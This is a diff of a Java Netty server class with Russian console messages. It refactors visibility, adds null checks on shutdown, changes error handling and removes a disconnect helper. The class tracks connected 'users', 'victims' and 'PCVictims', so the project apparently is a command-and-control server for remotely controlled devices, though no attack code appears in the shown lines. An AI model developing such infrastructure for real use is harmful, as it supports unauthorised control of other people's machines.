@@ -7,7 +7,6 @@ import io.netty.channel.nio.NioEventLoopGroup;
 import io.netty.channel.socket.SocketChannel;
 import io.netty.channel.socket.nio.NioServerSocketChannel;
 
-import java.io.*;
 import java.sql.SQLException;
 import java.util.HashMap;
 import java.util.Map;
@@ -23,22 +22,18 @@ public class NettyServer {
     private HashMap<ChannelId, Victim> victims;
     private HashMap<ChannelId, PCVictim> pcVictims;
 
-    public NettyServer(int port) {
+    private NettyServer(int port) {
         this.port = port;
         this.users = new HashMap<>();
         this.victims = new HashMap<>();
         this.pcVictims = new HashMap<>();
     }
 
-    public static NettyServer getInstance() {
-        return nettyServer;
-    }
-
-    public static DBManager getDBManager() {
+    static DBManager getDBManager() {
         return nettyServer.dbManager;
     }
 
-    public void run() {
+    private void run() {
         newConnectionDB();
         startServer();
     }
@@ -56,7 +51,7 @@ public class NettyServer {
                     .channel(NioServerSocketChannel.class)
                     .childHandler(new ChannelInitializer<SocketChannel>() {
                         @Override
-                        public void initChannel(SocketChannel ch) throws Exception {
+                        public void initChannel(SocketChannel ch) {
                             ch.pipeline().addLast(
                                     new RequestDecoder(),
                                     new ResponseEncoder(),
@@ -72,8 +67,8 @@ public class NettyServer {
         } catch (Exception e) {
             System.out.println("Ошибка запуска сервера! Занят порт: "+port);
         } finally {
-            workerGroup.shutdownGracefully();
-            bossGroup.shutdownGracefully();
+            if (workerGroup != null) workerGroup.shutdownGracefully();
+            if (bossGroup != null) bossGroup.shutdownGracefully();
             if (in != null) in.close();
         }
     }
@@ -82,14 +77,9 @@ public class NettyServer {
         in = new Scanner(System.in);
         String input;
         while ((input = in.nextLine()) != null) {
-            try {
-                String[] params = input.split(" ");
-                if (params.length == 0) System.out.println("Неверный ввод! (см. [command] [params...])");
-                else
-                    receiveInputConsole(params);
-            } catch (Exception e) {
-                System.out.println("Запрос должен быть формата JSON!");
-            }
+            String[] params = input.split(" ");
+            if (params.length == 0) System.out.println("Неверный ввод! (см. [command] [params...])");
+            else receiveInputConsole(params);
         }
     }
 
@@ -146,7 +136,7 @@ public class NettyServer {
                 printPCVictims();
                 break;
             default:
-                System.out.println("Команда не респознана!");
+                System.out.println("Команды "+params[0]+" не существует!");
         }
     }
 
@@ -167,39 +157,33 @@ public class NettyServer {
         }
     }
 
-    public HashMap<ChannelId, User> getUsers() {
+    HashMap<ChannelId, User> getUsers() {
         return users;
     }
 
-    public HashMap<ChannelId, Victim> getVictims() {
+    HashMap<ChannelId, Victim> getVictims() {
         return victims;
     }
 
-    public HashMap<ChannelId, PCVictim> getPcVictims() {
+    HashMap<ChannelId, PCVictim> getPcVictims() {
         return pcVictims;
     }
 
-    public Victim getVictimByName(String name) {
+    Victim getVictimByName(String name) {
         for (Map.Entry<ChannelId, Victim> entry : victims.entrySet()) {
             if (entry.getValue().getName().equals(name)) return entry.getValue();
         }
         return null;
     }
 
-    public void disconnectPCVictimsByName(String name) {
-        for (Map.Entry<ChannelId, PCVictim> entry : pcVictims.entrySet()) {
-            if (entry.getValue().getName().equals(name)) entry.getValue().disconnect();
-        }
-    }
-
-    public PCVictim getPCVictimByName(String name) {
+    PCVictim getPCVictimByName(String name) {
         for (Map.Entry<ChannelId, PCVictim> entry : pcVictims.entrySet()) {
             if (entry.getValue().getName().equals(name)) return entry.getValue();
         }
         return null;
     }
 
-    public User getUserByName(String name) {
+    User getUserByName(String name) {
         for (Map.Entry<ChannelId, User> entry : users.entrySet()) {
             if (entry.getValue().getLogin().equals(name)) return entry.getValue();
         }
